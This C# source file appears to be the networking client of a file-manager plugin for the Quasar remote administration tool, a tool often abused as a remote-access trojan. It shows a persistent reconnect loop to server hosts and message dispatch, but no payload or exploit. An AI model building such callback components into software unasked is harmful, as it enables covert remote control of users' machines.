﻿
using Quasar.Common.DNS;
using Quasar.Common.Helpers;
using Quasar.Common.Messages;
using Quasar.Common.Utilities;
using System;
using System.Diagnostics;
using System.Security.Cryptography.X509Certificates;
using System.Threading;

namespace Plugin.Networking
{
    public class QuasarClient : Client, IDisposable
    {
        /// <summary>
        /// Used to keep track if the client has been identified by the server.
        /// </summary>
        private bool _identified;

        /// <summary>
        /// The hosts manager which contains the available hosts to connect to.
        /// </summary>
        private readonly HostsManager _hosts;

        /// <summary>
        /// Random number generator to slightly randomize the reconnection delay.
        /// </summary>
        private readonly SafeRandom _random;

        /// <summary>
        /// Create a <see cref="_token"/> and signals cancellation.
        /// </summary>
        private readonly CancellationTokenSource _tokenSource;

        /// <summary>
        /// The token to check for cancellation.
        /// </summary>
        private readonly CancellationToken _token;

        /// <summary>
        /// Initializes a new instance of the <see cref="QuasarClient"/> class.
        /// </summary>
        /// <param name="hostsManager">The hosts manager which contains the available hosts to connect to.</param>
        /// <param name="serverCertificate">The server certificate.</param>
        public QuasarClient(HostsManager hostsManager, X509Certificate2 serverCertificate)
            : base(serverCertificate)
        {
            this._hosts = hostsManager;
            this._random = new SafeRandom();
            base.ClientState += OnClientState;
            base.ClientRead += OnClientRead;
            base.ClientFail += OnClientFail;
            this._tokenSource = new CancellationTokenSource();
            this._token = _tokenSource.Token;
        }

        /// <summary>
        /// Connection loop used to reconnect and keep the connection open.
        /// </summary>
        public void ConnectLoop()
        {
            
            // TODO: do not re-use object
            while (!_token.IsCancellationRequested)
            {
                if (!Connected)
                {
                    try
                    {
                        Host host = _hosts.GetNextHost();

                        base.Connect(host.IpAddress, host.Port);
                    }
                    catch (Exception ex)
                    {
                       
                    }
                   
                }

                while (Connected) // hold client open
                {
                    try
                    {
                        _token.WaitHandle.WaitOne(1000);
                    }
                    catch (Exception e) when (e is NullReferenceException || e is ObjectDisposedException)
                    {
                        Disconnect();
                        return;
                    }
                }

                if (_token.IsCancellationRequested)
                {
                    Disconnect();
                    return;
                }

                Thread.Sleep(1000);
            }
        }

        private void OnClientRead(Client client, IMessage message, int messageLength)
        {
            if (!_identified)
            {
                
                return;
            }

            MessageHandler.Process(client, message);
        }

        private void OnClientFail(Client client, Exception ex)
        {
            Debug.WriteLine("Client Fail - Exception Message: " + ex.Message);
            client.Disconnect();
        }

        private void OnClientState(Client client, bool connected)
        {

            if (connected)
            {
               

                client.Send(new PluginStarted { Message= "FrmFileManager" }
                );


                _identified = true;
            }
            else
            {
                Exit();
            }
        }

        /// <summary>
        /// Stops the connection loop and disconnects the connection.
        /// </summary>
        public void Exit()
        {
            _tokenSource.Cancel();
            Disconnect();
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this activity detection service.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                _tokenSource.Cancel();
                _tokenSource.Dispose();
            }
        }
    }
}
